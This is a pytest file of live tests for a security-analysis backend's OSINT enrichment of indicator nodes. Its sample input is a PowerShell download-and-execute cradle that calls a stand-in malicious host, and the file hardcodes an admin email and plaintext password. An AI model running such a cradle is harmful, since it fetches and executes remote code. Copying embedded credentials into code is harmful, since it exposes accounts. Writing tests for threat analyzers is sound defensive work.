"""Live endpoint tests for P1-01 OSINT wiring.

Hits the running preview backend via REACT_APP_BACKEND_URL and asserts:
  - /api/decode/smart returns cio.metadata.osint populated with engine='shared:workspace'
  - IOC nodes have attrs.enrichment.providers[] with 11-field cards
  - /api/v2/auto-investigate is enriched with the same shape (parity)
  - Endpoints do NOT return 500 when no OSINT keys are configured
"""
import os
import requests
import pytest

BASE_URL = os.environ["REACT_APP_BACKEND_URL"].rstrip("/")
ADMIN_EMAIL = "admin@nivxray.com"
ADMIN_PASSWORD = "uulVDp5cCSB3Hva99s7UUAwK"

REQUIRED_CARD_FIELDS = {
    "name", "state", "malicious", "suspicious", "harmless",
    "reputation", "detail", "first_seen", "last_seen", "tags", "link",
}
ALLOWED_STATES = {"hit", "clean", "no-key", "no-hit", "error"}

PS_PAYLOAD = "powershell IEX (New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.exe')"


@pytest.fixture(scope="module")
def token():
    r = requests.post(f"{BASE_URL}/api/auth/login",
                      json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD}, timeout=90)
    assert r.status_code == 200, f"login failed: {r.status_code} {r.text[:200]}"
    return r.json()["access_token"]


@pytest.fixture(scope="module")
def auth_headers(token):
    return {"Authorization": f"Bearer {token}"}


def _find_cio(resp_json):
    """CIO may be nested. Return dict with metadata + evidence_graph."""
    if isinstance(resp_json, dict):
        if "metadata" in resp_json and "evidence_graph" in resp_json:
            return resp_json
        for key in ("cio", "CIO", "result", "data"):
            v = resp_json.get(key)
            if isinstance(v, dict) and "metadata" in v and "evidence_graph" in v:
                return v
    return None


def test_decode_smart_returns_osint_bundle(auth_headers):
    r = requests.post(f"{BASE_URL}/api/decode/smart",
                      json={"input": PS_PAYLOAD}, headers=auth_headers, timeout=90)
    assert r.status_code == 200, f"got {r.status_code}: {r.text[:400]}"
    body = r.json()
    cio = _find_cio(body)
    assert cio is not None, f"no CIO in response. keys={list(body.keys())[:20]}"
    md = cio["metadata"].get("osint")
    assert md is not None, f"cio.metadata.osint missing. metadata keys={list(cio['metadata'].keys())}"
    assert md.get("engine") == "shared:workspace", f"engine={md.get('engine')}"
    assert "local" in md and "live" in md and "providers_used" in md


def test_decode_smart_ioc_nodes_have_provider_cards(auth_headers):
    r = requests.post(f"{BASE_URL}/api/decode/smart",
                      json={"input": PS_PAYLOAD}, headers=auth_headers, timeout=90)
    assert r.status_code == 200
    cio = _find_cio(r.json())
    ioc_nodes = [n for n in cio["evidence_graph"]["nodes"] if n.get("kind") == "ioc"]
    assert len(ioc_nodes) >= 1, "expected >=1 IOC node"
    for n in ioc_nodes:
        enr = (n.get("attrs") or {}).get("enrichment")
        assert enr is not None, f"node {n.get('id')} missing attrs.enrichment"
        provs = enr.get("providers")
        assert isinstance(provs, list) and len(provs) >= 1, f"node {n.get('id')} has no provider cards"
        for card in provs:
            missing = REQUIRED_CARD_FIELDS - set(card.keys())
            assert not missing, f"card {card.get('name')} missing fields: {missing}"
            assert card["state"] in ALLOWED_STATES, f"bad state {card['state']}"


def test_auto_investigate_parity_enrichment(auth_headers):
    r = requests.post(f"{BASE_URL}/api/v2/auto-investigate",
                      json={"incident_text": PS_PAYLOAD},
                      headers=auth_headers, timeout=120)
    if r.status_code == 404:
        pytest.skip("v2 auto-investigate not mounted")
    assert r.status_code == 200, f"got {r.status_code}: {r.text[:400]}"
    body = r.json()
    cio = _find_cio(body)
    assert cio is not None, f"no CIO. keys={list(body.keys())[:20]}"
    md = cio["metadata"].get("osint")
    assert md is not None, "cio.metadata.osint missing on auto-investigate"
    assert md.get("engine") == "shared:workspace"
    # Parity: IOC nodes should also carry provider cards.
    ioc_nodes = [n for n in cio["evidence_graph"]["nodes"] if n.get("kind") == "ioc"]
    if ioc_nodes:
        for n in ioc_nodes:
            enr = (n.get("attrs") or {}).get("enrichment")
            assert enr and isinstance(enr.get("providers"), list) and enr["providers"], \
                f"auto-investigate node {n.get('id')} missing provider cards"
            for card in enr["providers"]:
                missing = REQUIRED_CARD_FIELDS - set(card.keys())
                assert not missing, f"auto-inv card {card.get('name')} missing: {missing}"


def test_no_500_on_default_key_state(auth_headers):
    """Sanity: default state (no live keys) must not 500."""
    r = requests.post(f"{BASE_URL}/api/decode/smart",
                      json={"input": PS_PAYLOAD}, headers=auth_headers, timeout=90)
    assert r.status_code != 500, f"500 on default keys: {r.text[:400]}"
    assert r.status_code == 200
